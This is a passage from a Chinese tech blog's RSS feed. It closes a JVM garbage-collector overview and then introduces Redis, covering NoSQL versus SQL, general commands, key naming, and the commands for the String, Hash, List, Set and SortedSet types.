&lt;p&gt;老年代单线程收集器，Serial收集器的老年代版本；&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Parallel Old收集器 (标记-整理算法)：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;老年代并行收集器，吞吐量优先，Parallel Scavenge收集器的老年代版本；&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;CMS(Concurrent Mark Sweep)收集器（标记-清除算法）：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;老年代并行收集器，以获取最短回收停顿时间为目标的收集器，具有高并发、低停顿的特点，追求最短GC回收停顿时间。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;G1(Garbage First)收集器 (标记-整理算法)：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Java堆并行收集器，G1收集器是JDK1.7提供的一个新收集器，G1收集器基于“标记-整理”算法实现，也就是说不会产生内存碎片。此外，G1收集器不同于之前的收集器的一个重要特点是：G1回收的范围是整个Java堆（包括新生代，老年代），而前六种收集器回收的范围仅限于新生代或老年代。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;ZGC (Z Garbage Collector)：&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;是一款由Oracle公司研发的，以低延迟为首要目标的一款垃圾收集器。它是基于动态Region内存布局，（暂时）不设年龄分代，使用了读屏障、染色指针和内存多重映射等技术来实现可并发的标记-整理算法的收集器。在 JDK 11 新加入，还在实验阶段，主要特点是：回收TB级内存（最大4T），停顿时间不超过10ms。优点：低停顿，高吞吐量，ZGC 收集过程中额外耗费的内存小。缺点：浮动垃圾。&lt;/p&gt;
&lt;/details&gt;</description>
                
                
                
                
                
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/categories/java/">JAVA</category>
                                
                            
                        
                    
                        
                            
                                
                                
                                
                                    <category domain="https://xuoneyuan.github.io/tags/jvm/">JVM</category>
                                
                            
                        
                    
                
            </item>
        
            <item>
                <title>Redis</title>
                <link>https://xuoneyuan.github.io/posts/21/</link>
                <guid isPermaLink="true">https://xuoneyuan.github.io/posts/21/</guid>
                <pubDate>Sun, 05 May 2024 19:33:17 &#43;0800</pubDate>
                
                    <author>xuoneyuan@gmail.com (falcone)</author>
                
                <copyright>[CC BY-NC-SA 4.0](https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh)</copyright>
                
                    <description>&lt;h2 id=&#34;初识redis&#34;&gt;初识Redis&lt;/h2&gt;
&lt;p&gt;Redis是一种键值型的NoSQL数据库，这里有两个关键字&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;键值型&lt;/li&gt;
&lt;li&gt;NoSQL
其中键值型是指Redis中存储的数据都是以Key-Value键值对的形式存储，而Value的形式多种多样，可以使字符串、数值甚至Json&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;而NoSQL则是相对于传统关系型数据库而言，有很大差异的一种数据库&lt;/p&gt;
&lt;h3 id=&#34;认识nosql&#34;&gt;认识NoSQL&lt;/h3&gt;
&lt;p&gt;NoSql可以翻译做Not Only Sql（不仅仅是SQL），或者是No Sql（非Sql的）数据库。是相对于传统关系型数据库而言，有很大差异的一种特殊的数据库，因此也称之为非关系型数据库。&lt;/p&gt;
&lt;h4 id=&#34;结构化与非结构化&#34;&gt;结构化与非结构化&lt;/h4&gt;
&lt;p&gt;传统关系型数据库是结构化数据，每张表在创建的时候都有严格的约束信息，如字段名、字段数据类型、字段约束等，插入的数据必须遵循这些约束&lt;/p&gt;
&lt;p&gt;而NoSQL则对数据库格式没有约束，可以是键值型，也可以是文档型，甚至是图格式&lt;/p&gt;
&lt;h4 id=&#34;关联与非关联&#34;&gt;关联与非关联&lt;/h4&gt;
&lt;p&gt;传统数据库的表与表之间往往存在关联，例如外键约束&lt;/p&gt;
&lt;p&gt;而非关系型数据库不存在关联关系，要维护关系要么靠代码中的业务逻辑，要么靠数据之间的耦合&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;{
  id: 1,
  name: &amp;#34;张三&amp;#34;,
  orders: [
    {
       id: 1,
       item: {
	 id: 10, title: &amp;#34;荣耀6&amp;#34;, price: 4999
       }
    },
    {
       id: 2,
       item: {
	 id: 20, title: &amp;#34;小米11&amp;#34;, price: 3999
       }
    }
  ]
}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;例如此处要维护张三与两个手机订单的关系，不得不冗余的将这两个商品保存在张三的订单文档中，不够优雅，所以建议使用业务逻辑来维护关联关系&lt;/p&gt;
&lt;h4 id=&#34;查询方式&#34;&gt;查询方式&lt;/h4&gt;
&lt;p&gt;传统关系型数据库会基于Sql语句做查询，语法有统一的标准&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;SELECT id, age FROM tb_user WHERE id = 1
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;而不同的非关系型数据库查询语法差异极大&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Redis:  get user:1
MongoDB: db.user.find({_id: 1})
elasticsearch:  GET http://localhost:9200/users/1
&lt;/code&gt;&lt;/pre&gt;&lt;h4 id=&#34;事务&#34;&gt;事务&lt;/h4&gt;
&lt;p&gt;传统关系型数据库能满足事务的ACID原则(原子性、一致性、独立性及持久性)&lt;/p&gt;
&lt;p&gt;而非关系型数据库汪汪不支持事务，或者不能要个保证ACID的特性，只能实现计本的一致性&lt;/p&gt;
&lt;h4 id=&#34;总结&#34;&gt;总结&lt;/h4&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;特性&lt;/th&gt;
&lt;th&gt;SQL&lt;/th&gt;
&lt;th&gt;NoSQL&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;数据结构&lt;/td&gt;
&lt;td&gt;结构化 (Structured)&lt;/td&gt;
&lt;td&gt;非结构化 (Unstructured)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;数据关联&lt;/td&gt;
&lt;td&gt;关联的 (Relational)&lt;/td&gt;
&lt;td&gt;无关联的 (Non-relational)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;查询方式&lt;/td&gt;
&lt;td&gt;SQL 查询&lt;/td&gt;
&lt;td&gt;非 SQL (Non-SQL)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;事务特性&lt;/td&gt;
&lt;td&gt;ACID&lt;/td&gt;
&lt;td&gt;BASE&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;存储方式&lt;/td&gt;
&lt;td&gt;磁盘 (Disk-based)&lt;/td&gt;
&lt;td&gt;内存 (Memory-based)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;扩展性&lt;/td&gt;
&lt;td&gt;垂直扩展 (Vertical scalability)&lt;/td&gt;
&lt;td&gt;水平扩展 (Horizontal scalability)&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;使用场景&lt;/td&gt;
&lt;td&gt;1) 数据结构固定&lt;/td&gt;
&lt;td&gt;1) 数据结构不固定&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;2) 对一致性、安全性要求高&lt;/td&gt;
&lt;td&gt;2) 相关业务对数据安全性、一致性要求较高&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;&lt;/td&gt;
&lt;td&gt;3) 对性能要求高&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;存储方式
&lt;ul&gt;
&lt;li&gt;关系型数据库基于磁盘进行存储，会有大量的磁盘IO，对性能有一定影响&lt;/li&gt;
&lt;li&gt;非关系型数据库，他们的操作更多的是依赖于内存来操作，内存的读写速度会非常快，性能自然会好一些&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;扩展性
&lt;ul&gt;
&lt;li&gt;关系型数据库集群模式一般是主从，主从数据一致，起到数据备份的作用，称为垂直扩展。&lt;/li&gt;
&lt;li&gt;非关系型数据库可以将数据拆分，存储在不同机器上，可以保存海量数据，解决内存大小有限的问题。称为水平扩展。&lt;/li&gt;
&lt;li&gt;关系型数据库因为表之间存在关联关系，如果做水平扩展会给数据查询带来很多麻烦&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;认识redis&#34;&gt;认识Redis&lt;/h3&gt;
&lt;p&gt;Redis诞生于2009年，全称是Remote Dictionary Server远程词典服务器，是一个基于内存的键值型NoSQL数据库。&lt;/p&gt;
&lt;p&gt;特征：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;键值(Key-Value)型，Value支持多种不同的数据结构，功能丰富&lt;/li&gt;
&lt;li&gt;单线程，每个命令具有原子性&lt;/li&gt;
&lt;li&gt;低延迟，速度快(基于内存、IO多路复用、良好的编码)&lt;/li&gt;
&lt;li&gt;支持数据持久化&lt;/li&gt;
&lt;li&gt;支持主从集群、分片集群&lt;/li&gt;
&lt;li&gt;支持多语言客户端&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;redis常用命令&#34;&gt;Redis常用命令&lt;/h2&gt;
&lt;p&gt;Redis是典型的key-value数据库，key一般是字符串，而value包含很多不同的数据类型&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;https://xuoneyuan.github.io/images/redis2.png&#34; alt=&#34;1&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;redis通用命令&#34;&gt;Redis通用命令&lt;/h3&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;命令&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;KEYS pattern&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;查找所有符合给定模式 (pattern) 的 key&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;EXISTS key&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;检查给定 key 是否存在&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;TYPE key&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;返回 key 所储存的值的类型&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;TTL key&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;返回给定 key 的剩余生存时间 (TTL, time to live)，以秒为单位&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;DEL key&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;该命令用于在 key 存在时删除 key&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;ul&gt;
&lt;li&gt;KEYS：查看符合模板的所有key
&lt;ul&gt;
&lt;li&gt;不建议在生产环境设备上使用，因为Redis是单线程的，执行查询的时候会阻塞其他命令，当数据量很大的时候，使用KEYS进行模糊查询，效率很差&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;DEL：删除一个指定的key
&lt;ul&gt;
&lt;li&gt;也可以删除多个key，DEL name age，会将name和age都删掉&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;EXISTS：判断key是否存在
&lt;ul&gt;
&lt;li&gt;EXISTS name，如果存在返回1，不存在返回0&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;EXPIRE：给一个key设置有效期，有效期到期时该key会被自动删除
&lt;ul&gt;
&lt;li&gt;EXPIRE name 20，给name设置20秒有效期，到期自动删除&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;TTL：查看一个key的剩余有效期(Time-To-Live)
&lt;ul&gt;
&lt;li&gt;TTL name，查看name的剩余有效期，如果未设置有效期，则返回-1&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;string类型&#34;&gt;String类型&lt;/h3&gt;
&lt;p&gt;String类型，也就是字符串类型，是Redis中最简单的存储类型&lt;/p&gt;
&lt;p&gt;其value是字符串，不过根据字符串的格式不同，又可以分为3类&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;string：普通字符串&lt;/li&gt;
&lt;li&gt;int：整数类型，可以做自增、自减操作&lt;/li&gt;
&lt;li&gt;float：浮点类型，可以做自增、自减操作&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;不管是哪种格式，底层都是字节数组形式存储，只不过是编码方式不同，字符串类型的最大空间不能超过512M&lt;/p&gt;
&lt;h4 id=&#34;string的常用命令&#34;&gt;String的常用命令&lt;/h4&gt;
&lt;p&gt;String的常用命令有&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;命令&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;SET&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;添加或者修改一个已经存在的 String 类型的键值对&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;GET&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;根据 key 获取 String 类型的 value&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;MSET&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;批量添加多个 String 类型的键值对&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;MGET&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;根据多个 key 获取多个 String 类型的 value&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;INCR&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;让一个整型的 key 自增 1&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;INCRBY&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;让一个整型的 key 自增并指定步长值，例如：&lt;code&gt;INCRBY num 2&lt;/code&gt; 让 &lt;code&gt;num&lt;/code&gt; 值自增 2&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;INCRBYFLOAT&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;让一个浮点类型的数字自增并指定步长值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;SETNX&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;添加一个 String 类型的键值对，前提是这个 key 不存在，否则不执行，可以理解为真正的新增&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;SETEX&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;添加一个 String 类型的键值对，并指定有效期&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h4 id=&#34;key结构&#34;&gt;Key结构&lt;/h4&gt;
&lt;p&gt;Redis没有类似MySQL中Table的概念，那么我们该如何区分不同类型的Key呢？&lt;/p&gt;
&lt;p&gt;例如：需要存储用户、商品信息到Redis，有一个用户的id是1，有一个商品的id恰好也是1，如果此时使用id作为key，那么就回冲突，该怎么办？&lt;/p&gt;
&lt;p&gt;我们可以通过给key添加前缀加以区分，不过这个前缀不是随便加的，有一定的规范&lt;/p&gt;
&lt;p&gt;Redis的key允许有多个单词形成层级结构，多个单词之间用:隔开，格式如下&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;项目名:业务名:类型:id
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;这个格式也并非是固定的，可以根据自己的需求来删除/添加词条，这样我们就可以把不同数据类型的数据区分开了，从而避免了key的冲突问题&lt;/p&gt;
&lt;p&gt;例如我们的项目名叫reggie，有user和dish两种不同类型的数据，我们可以这样定义key&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;user相关的key：reggie:user:1&lt;/li&gt;
&lt;li&gt;dish相关的key：reggie:dish:1&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;如果value是一个Java对象，例如一个User对象，则可以将对象序列化为JSON字符串后存储&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;KEY&lt;/th&gt;
&lt;th&gt;VALUE&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;reggie:user:1&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;{“id”:1, “name”: “Jack”, “age”: 21}&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;reggie:dish:1&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;{“id”:1, “name”: “鲟鱼火锅”, “price”: 4999}&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;并且在Redis的桌面客户端中，也会以相同前缀作为层次结构，让数据看起来层次分明，关系清晰&lt;/p&gt;
&lt;h3 id=&#34;hash类型&#34;&gt;Hash类型&lt;/h3&gt;
&lt;p&gt;Hash类型，也叫散列，其中value是一个无序字典，类似于Java中的HashMap结构&lt;/p&gt;
&lt;p&gt;String结构是将对象序列化为JSON字符串后存储，当我们要修改对象的某个属性值的时候很不方便&lt;/p&gt;
&lt;p&gt;Hash结构可以将对象中的每个字段独立存储，可以针对单个字段做CRUD&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
    &lt;tr&gt;
      &lt;th&gt;KEY&lt;/th&gt;
      &lt;th colspan=&#34;2&#34;&gt;VALUE&lt;/th&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;th&gt;&lt;/th&gt;
      &lt;th&gt;field&lt;/th&gt;
      &lt;th&gt;value&lt;/th&gt;
    &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td rowspan=&#34;2&#34;&gt;reggie:user:1&lt;/td&gt;
      &lt;td&gt;name&lt;/td&gt;
      &lt;td&gt;Jack&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;age&lt;/td&gt;
      &lt;td&gt;21&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td rowspan=&#34;2&#34;&gt;reggie:user:2&lt;/td&gt;
      &lt;td&gt;name&lt;/td&gt;
      &lt;td&gt;Rose&lt;/td&gt;
    &lt;/tr&gt;
    &lt;tr&gt;
      &lt;td&gt;age&lt;/td&gt;
      &lt;td&gt;18&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
Hash的常用命令有
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;命令&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;HSET key field value&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;添加或者修改 hash 类型 key 的 field 的值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;HGET key field&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;获取一个 hash 类型 key 的 field 的值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;HMSET&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;批量添加多个 hash 类型 key 的 field 的值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;HMGET&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;批量获取多个 hash 类型 key 的 field 的值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;HGETALL&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;获取一个 hash 类型的 key 中的所有的 field 和 value&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;HKEYS&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;获取一个 hash 类型的 key 中的所有的 field&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;HINCRBY&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;让一个 hash 类型 key 的字段值自增并指定步长&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;HSETNX&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;添加一个 hash 类型的 key 的 field 值，前提是这个 field 不存在，否则不执行&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;list类型&#34;&gt;List类型&lt;/h3&gt;
&lt;p&gt;Redis中的List类型与Java中的LinkedList类似，可以看做是一个双向链表结构。既可以支持正向检索和也可以支持反向检索。&lt;/p&gt;
&lt;p&gt;特征也与LinkedList类似：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;有序&lt;/li&gt;
&lt;li&gt;元素可以重复&lt;/li&gt;
&lt;li&gt;插入和删除快&lt;/li&gt;
&lt;li&gt;查询速度一般&lt;/li&gt;
&lt;li&gt;常用来存储一个有序数据，例如：朋友圈点赞列表，评论列表等。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;List的常见命令有：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;命令&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;LPUSH key element ...&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;向列表左侧插入一个或多个元素&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;LPOP key&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;移除并返回列表左侧的第一个元素，没有则返回 nil&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;RPUSH key element ...&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;向列表右侧插入一个或多个元素&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;RPOP key&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;移除并返回列表右侧的第一个元素&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;LRANGE key start end&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;返回一段索引范围内的所有元素&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;BLPOP&lt;/code&gt; 和 &lt;code&gt;BRPOP&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;与 &lt;code&gt;LPOP&lt;/code&gt; 和 &lt;code&gt;RPOP&lt;/code&gt; 类似，只不过在没有元素时等待指定时间，而不是直接返回 nil&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;set类型&#34;&gt;Set类型&lt;/h3&gt;
&lt;p&gt;Redis的Set结构与Java中的HashSet类似，可以看做是一个value为null的HashMap。因为也是一个hash表，因此具备与HashSet类似的特征：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;无序&lt;/li&gt;
&lt;li&gt;元素不可重复&lt;/li&gt;
&lt;li&gt;查找快&lt;/li&gt;
&lt;li&gt;支持交集、并集、差集等功能&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Set的常见命令有：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;命令&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;SADD key member ...&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;向 set 中添加一个或多个元素&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;SREM key member ...&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;移除 set 中的指定元素&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;SCARD key&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;返回 set 中元素的个数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;SISMEMBER key member&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;判断一个元素是否存在于 set 中&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;SMEMBERS key&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;获取 set 中的所有元素&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;SINTER key1 key2 ...&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;求 key1 与 key2 的交集&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;SUNION key1 key2 ...&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;求 key1 与 key2 的并集&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;SDIFF key1 key2 ...&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;求 key1 与 key2 的差集&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h3 id=&#34;sortedset类型&#34;&gt;SortedSet类型&lt;/h3&gt;
&lt;p&gt;Redis的SortedSet是一个可排序的set集合，与Java中的TreeSet有些类似，但底层数据结构却差别很大。SortedSet中的每一个元素都带有一个score属性，可以基于score属性对元素排序，底层的实现是一个跳表（SkipList）加 hash表。&lt;/p&gt;
&lt;p&gt;SortedSet具备下列特性：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;可排序&lt;/li&gt;
&lt;li&gt;元素不重复&lt;/li&gt;
&lt;li&gt;查询速度快
因为SortedSet的可排序特性，经常被用来实现排行榜这样的功能。&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;SortedSet的常见命令有：&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;命令&lt;/th&gt;
&lt;th&gt;描述&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;ZADD key score member&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;添加一个或多个元素到 sorted set ，如果已经存在则更新其 score 值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;ZREM key member&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;删除 sorted set 中的一个指定元素&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;ZSCORE key member&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;获取 sorted set 中的指定元素的 score 值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;ZRANK key member&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;获取 sorted set 中的指定元素的排名&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;ZCARD key&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;获取 sorted set 中的元素个数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;ZCOUNT key min max&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;统计 score 值在给定范围内的所有元素的个数&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;ZINCRBY key increment member&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;让 sorted set 中的指定元素自增，步长为指定的 increment 值&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;ZRANGE key min max&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;按照 score 排序后，获取指定排名范围内的元素&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;ZRANGEBYSCORE key min max&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;按照 score 排序后，获取指定 score 范围内的元素&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;&lt;code&gt;ZDIFF&lt;/code&gt;、&lt;code&gt;ZINTER&lt;/code&gt;、&lt;code&gt;ZUNION&lt;/code&gt;&lt;/td&gt;
&lt;td&gt;求差集、交集、并集&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;h2 id=&#34;redis的java客户端&#34;&gt;Redis的Java客户端&lt;/h2&gt;
&lt;p&gt;目前主流的Redis的Java客户端有三种&lt;/p&gt;
&lt;ul&gt;
